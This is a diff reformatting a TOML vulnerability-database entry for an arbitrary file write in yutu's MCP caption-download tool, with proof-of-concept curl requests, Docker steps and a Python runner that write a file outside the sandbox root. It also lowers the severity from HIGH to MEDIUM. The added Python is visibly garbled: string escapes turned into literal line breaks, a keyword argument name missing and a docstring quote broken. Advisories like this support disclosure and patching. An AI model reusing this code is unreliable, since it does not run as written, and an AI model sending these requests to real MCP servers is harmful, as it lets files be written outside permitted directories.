@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0342"
-aliases = ["CVE-2026-50158","GHSA-2c7f-fxww-6w6c"]
-
 [basic]
-title = "yutu: Arbitrary File Write via MCP `caption-download` Tool"
-description = "## Arbitrary File Write via MCP `caption-download` Tool
+description = """
+## Arbitrary File Write via MCP `caption-download` Tool
 
 ### Summary
 
@@ -30,9 +26,9 @@ yutu uses `pkg.Root` (backed by Go 1.24's `os.OpenRoot`) to restrict all file I/
 ```go
 // cmd/caption/download.go
 var downloadInSchema = &jsonschema.Schema{
-    Required: []string{\"ids\", \"file\"},          // line 34
+    Required: []string{"ids", "file"},          // line 34
     // ...
-    \"file\": {Type: \"string\", Description: fileUsage},  // line 40
+    "file": {Type: "string", Description: fileUsage},  // line 40
 }
 
 // cobramcp.GenToolHandler binds MCP → handler (line 61-64)
@@ -75,16 +71,14 @@ The self-contained PoC builds a binary that exercises `caption.Download()` direc
 
 ```bash
 # From the report workspace root:
-docker build --no-cache -t yutu-vuln001-poc \
-    -f vuln-001/Dockerfile \
-    reports/mcp_49_eat-pray-ai__yutu
+docker build --no-cache -t yutu-vuln001-poc -f vuln-001/Dockerfile reports/mcp_49_eat-pray-ai__yutu
 
 docker run --rm yutu-vuln001-poc
 ```
 
 Expected output confirms:
-- `pkg.Root.Open(\"/tmp/poc-arbitrary-write.txt\")` is correctly rejected with `path escapes from parent` (control).
-- `caption.Download()` with `file=\"/tmp/poc-arbitrary-write.txt\"` succeeds and creates a 79-byte file **outside** `YUTU_ROOT` (exploit).
+- `pkg.Root.Open("/tmp/poc-arbitrary-write.txt")` is correctly rejected with `path escapes from parent` (control).
+- `caption.Download()` with `file="/tmp/poc-arbitrary-write.txt"` succeeds and creates a 79-byte file **outside** `YUTU_ROOT` (exploit).
 
 **Live MCP server reproduction:**
 
@@ -93,23 +87,13 @@ Expected output confirms:
 yutu mcp --mode http --port 8216
 
 # Initialise session
-curl -sD /tmp/yutu.headers \
-  -H 'Content-Type: application/json' \
-  -H 'Accept: application/json, text/event-stream' \
-  http://localhost:8216/mcp \
-  -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"poc\",\"version\":\"1\"}}}' \
-  >/tmp/yutu.init
+curl -sD /tmp/yutu.headers -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' http://localhost:8216/mcp -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1"}}}' >/tmp/yutu.init
 
-SID=$(awk 'tolower($1)==\"mcp-session-id:\"{print $2}' /tmp/yutu.headers | tr -d '\r')
+SID=$(awk 'tolower($1)=="mcp-session-id:"{print $2}' /tmp/yutu.headers | tr -d '\r')
 
 # Exploit: write caption to arbitrary path
 # Replace CAPTION_ID with a caption id accessible by the configured token
-curl -s \
-  -H 'Content-Type: application/json' \
-  -H 'Accept: application/json, text/event-stream' \
-  ${SID:+-H \"Mcp-Session-Id: $SID\"} \
-  http://localhost:8216/mcp \
-  -d '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"caption-download\",\"arguments\":{\"ids\":[\"CAPTION_ID\"],\"file\":\"/tmp/yutu-cve-poc.srt\",\"tfmt\":\"srt\"}}}'
+curl -s -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' ${SID:+-H "Mcp-Session-Id: $SID"} http://localhost:8216/mcp -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"caption-download","arguments":{"ids":["CAPTION_ID"],"file":"/tmp/yutu-cve-poc.srt","tfmt":"srt"}}}'
 
 # Verify file was written outside YUTU_ROOT
 test -s /tmp/yutu-cve-poc.srt && ls -l /tmp/yutu-cve-poc.srt
@@ -162,99 +146,112 @@ ENV YUTU_ROOT=/tmp/yutu_safe_root
 
 RUN mkdir -p /tmp/yutu_safe_root
 
-CMD [\"/poc\"]
+CMD ["/poc"]
 ```
 
 #### `poc.py`
 
 ```python
 #!/usr/bin/env python3
-\"\"\"
+""\"
 VULN-001 PoC Runner
 Exploit: Arbitrary File Write via MCP caption-download (CWE-73)
 Target : pkg/caption/caption.go:272 -- os.Create(c.File) without pkg.Root confinement
 
 Usage: python3 poc.py
-\"\"\"
+""\"
 import os
 import subprocess
 import sys
 
 VULN_DIR = os.path.dirname(os.path.abspath(__file__))
 CONTEXT_DIR = os.path.dirname(VULN_DIR) # mcp_49_eat-pray-ai__yutu/
-DOCKERFILE = os.path.join(VULN_DIR, \"Dockerfile\")
-IMAGE_NAME = \"yutu-vuln001-poc\"
+DOCKERFILE = os.path.join(VULN_DIR, "Dockerfile")
+IMAGE_NAME = "yutu-vuln001-poc"
 
 
 def run(cmd, check=False, **kwargs):
- print(\"$ \" + \" \".join(str(a) for a in cmd))
+ print("$ " + " ".join(str(a) for a in cmd))
  result = subprocess.run(cmd, =True, **kwargs)
  return result
 
 
 def main():
- print(\"=\" * 70)
- print(\"VULN-001: Arbitrary File Write via MCP caption-download\")
- print(\"CWE-73 | pkg/caption/caption.go:272 | os.Create(c.File)\")
- print(\"=\" * 70)
+ print("=" * 70)
+ print("VULN-001: Arbitrary File Write via MCP caption-download")
+ print("CWE-73 | pkg/caption/caption.go:272 | os.Create(c.File)")
+ print("=" * 70)
 
  # ── Build ────────────────────────────────────────────────────────────────
  build_cmd = [
- \"docker\", \"build\",
- \"--no-cache\",
- \"-t\", IMAGE_NAME,
- \"-f\", DOCKERFILE,
+ "docker", "build",
+ "--no-cache",
+ "-t", IMAGE_NAME,
+ "-f", DOCKERFILE,
  CONTEXT_DIR,
  ]
- print(\"\n[Step 1] Building Docker image ...\")
+ print("
+[Step 1] Building Docker image ...")
  result = run(build_cmd, capture_output=False)
  if result.returncode != 0:
- print(\"\n[FAIL] Docker build failed.\", file=sys.stderr)
+ print("
+[FAIL] Docker build failed.", file=sys.stderr)
  sys.exit(1)
 
  # ── Run ──────────────────────────────────────────────────────────────────
- run_cmd = [\"docker\", \"run\", \"--rm\", IMAGE_NAME]
- print(\"\n[Step 2] Running PoC container ...\")
+ run_cmd = ["docker", "run", "--rm", IMAGE_NAME]
+ print("
+[Step 2] Running PoC container ...")
  result = run(run_cmd, capture_output=True)
 
- stdout = result.stdout or \"\"
- stderr = result.stderr or \"\"
- print(stdout, end=\"\")
+ stdout = result.stdout or ""
+ stderr = result.stderr or ""
+ print(stdout, end="")
  if stderr:
- print(stderr, end=\"\", file=sys.stderr)
+ print(stderr, end="", file=sys.stderr)
 
  # ── Verdict ──────────────────────────────────────────────────────────────
  passed = (
  result.returncode == 0
- and \"VULNERABILITY CONFIRMED\" in stdout
- and \"PASS\" in stdout
- and \"os.Create bypasses pkg.Root\" in stdout
+ and "VULNERABILITY CONFIRMED" in stdout
+ and "PASS" in stdout
+ and "os.Create bypasses pkg.Root" in stdout
  )
 
  if passed:
- print(\"\n[RESULT] PASS – vulnerability dynamically reproduced.\")
+ print("
+[RESULT] PASS – vulnerability dynamically reproduced.")
  else:
- print(f\"\n[RESULT] FAIL – container exit code {result.returncode}.\", file=sys.stderr)
+ print(f"
+[RESULT] FAIL – container exit code {result.returncode}.", file=sys.stderr)
  sys.exit(1)
 
 
-if __name__ == \"__main__\":
+if __name__ == "__main__":
  main()
-```"
-severity = "HIGH"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+```"""
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "yutu: Arbitrary File Write via MCP `caption-download` Tool"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-50158",
+    "GHSA-2c7f-fxww-6w6c",
+]
+ave_id = "AVE-2026-0342"
+
+[meta]
+collected_at = "2026-07-23T02:50:56.703276539+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-23T02:50:56.703276539+00:00"
